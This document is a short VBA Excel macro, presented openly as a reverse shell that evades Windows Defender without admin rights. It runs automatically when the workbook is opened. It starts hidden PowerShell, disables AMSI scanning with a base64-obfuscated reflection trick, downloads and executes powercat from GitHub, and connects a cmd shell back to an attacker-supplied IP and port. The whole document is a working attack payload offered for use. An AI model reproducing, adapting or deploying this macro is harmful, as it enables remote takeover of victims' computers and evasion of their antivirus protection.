Simple vba reverse shell that bypass Windows Defender without admin rights

Private Sub Workbook_Open()
'
' Macro1 Macro
'
    ' Variable creation 
    ' programm is going to open powershell
    ' argsRvbypass are the powershell command that will bypass windows defender and make a reverse shell
    Dim program As String
    Dim argsRvbypass As String
    
    ' Setting up the variable to open powershell with hiden style 
    program = "powershell -windowstyle hidden -command"
    
    ' Setting up the variable to the commands that powershell will executed
    ' In order to bypass windows defender I used the Base64 Encoding bypasss. This technique prevents AMSI scanning capability for the current process by setting the “amsiInitFailed” flag.
    ' Don't forget to change the IP address
    argsRvbypass = "[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true);IEX(New-Object -type System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c [YOUR IP] -p [YOUR PORT] -e cmd"
    
    ' We're calling a shell with the variables that we set,  the Chr(34) returns the “ sign (double quotes).
    Call Shell(program & " " & Chr(34) & argsRvbypass & Chr(34))
End Sub
